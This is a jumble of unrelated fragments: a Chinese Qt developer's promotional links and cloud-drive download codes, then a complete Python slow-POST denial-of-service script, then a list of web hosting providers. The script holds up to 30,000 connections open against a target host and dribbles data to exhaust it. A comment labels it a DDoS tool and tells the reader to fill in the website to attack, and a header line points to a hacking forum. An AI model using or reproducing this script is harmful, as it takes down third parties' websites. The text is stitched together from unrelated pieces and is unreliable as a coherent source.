http://blog.sina.com.cn/liang19890820
qt组件   简书：https://www.jianshu.com/u/1250ab46f9ad
https://www.jianshu.com/c/1b908f2aab44
SDK下载链接：https://pan.baidu.com/s/1A5Gd77kExm8Co5ckT51vvQ 提取码：877p
下载链接中包含了各个版本的动态库文件，所有控件的头文件，使用demo，自定义控件+属性设计器。
自定义控件插件开放动态库dll使用（永久免费），无任何后门和限制，请放心使用。
目前已提供26个版本的dll，其中包括了qt5.12.3 msvc2017 32+64 mingw 32+64 的。
不定期增加控件和完善控件，不定期更新SDK，欢迎各位提出建议，谢谢！
widget版本（QQ：517216493）qml版本（QQ：373955953）三峰驼（QQ：278969898）。
涛哥的知乎专栏 Qt进阶之路 https://zhuanlan.zhihu.com/TaoQt
欢迎关注微信公众号【高效程序员】，C++/Python、学习方法、写作技巧、热门技术、职场发展等内容，干货多多，福利多多！
Qt入门书籍推荐霍亚飞的《Qt Creator快速入门》《Qt5编程入门》，Qt进阶书籍推荐官方的《C++ GUI Qt4编程》。
强烈推荐程序员自我修养和规划系列书《大话程序员》《程序员的成长课》《解忧程序员》

链接：https://pan.baidu.com/s/10LeAj8vcXaTjr8MgKjRC9A 
提取码：78bz 
复制这段内容后打开百度网盘手机App，操作更方便哦

链接：https://pan.baidu.com/s/1asDezZy9ZfLZ2LIa3RsIaQ 
提取码：liol 
复制这段内容后打开百度网盘手机App，操作更方便哦

链接：https://pan.baidu.com/s/1OW_T2KUu6zWjE9OCUN8kZg 
提取码：fiee

链接：https://pan.baidu.com/s/1p8NhQBf5sDVU3tfs0naicQ 
提取码：io03

用户名
@StockMarketGossip

https://drive.google.com/file/d/1dF8K5RzVT6EC9I84LTdp5bCC0vn2LbnG/view

https://edu.csdn.net/course/detail/10750

https://drive.google.com/file/d/1DNRlFUil5O4CEhkUpfnGjXTdr9tOp21r/view?usp=sharing

https://drive.google.com/file/d/1Cnl42jLjVgpyO4PkIFzKWDLwjVy8cVCZ/view?usp=sharing

https://github.com/fluttercandies/wechat_flutter

#!/usr/bin/env python// .ly https://sinister   hz2vAkv#aLfZ   https://hackforums.net/member.php
#https://paper.seebug.org/142/
#https://core.ac.uk/download/pdf/154333223.pdf
import socket
import time
import threading
#Pressure Test,ddos tool
#---------------------------
MAX_CONN=30000
#改写下面的网址为你想攻击的网站！！！！！！！！！
PORT=80
HOST="www..com"
PAGE="/recitewords/api"
#---------------------------
buf=("POST %s HTTP/1.1\r\n"
"Host: %s\r\n"
"Content-Length: 10000\r\n"
"Cookie: dklkt_dos_test\r\n"
"\r\n" % (PAGE,HOST))
socks=[]
def conn_thread():
    global socks
    while len(socks)<MAX_CONN:
        s=socket.socket (socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((HOST,PORT))
            s.send(buf.encode('utf-8'))
            #print ("[+] Send buf OK!,conn=%d\n"%len(socks))
            socks.append(s)
        except Exception as ex:
            print ("[-] Could not connect to server or send error:%s"%ex)
            time.sleep(2)
#end def
def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f".encode('utf-8'))
                #print ("[+] send OK! %s"%s)
            except Exception as ex:
                print ("[-] send Exception:%s\n"%ex)
                socks.remove(s)
                s.close()
                time.sleep(1)
#end def
conn_th=threading.Thread(target=conn_thread,args=())
send_th=threading.Thread(target=send_thread,args=())
conn_th.start()
send_th.start()
while(True):
    print("存活连接数：%d "%len(socks))
    time.sleep(1)
    
    
    
 CertifiedHosting - 成立于1999年，CertifiedHosting提供共享虚拟主机，经销主机托管和独立服务器。
NameCheap - Namecheap成立于2000年，是目前互联网上最大的域名注册商之一。自成立以来，Namecheap提供了许多服务，包括共享主机，经销主机托管，VPS主机和专用服务器。
BitcoinWebHosting - BitcoinWebHosting是专门提供主机服务给比特币社区的美国主机商。

https://clients.hostsailor.com/viewinvoice.php?id=171054
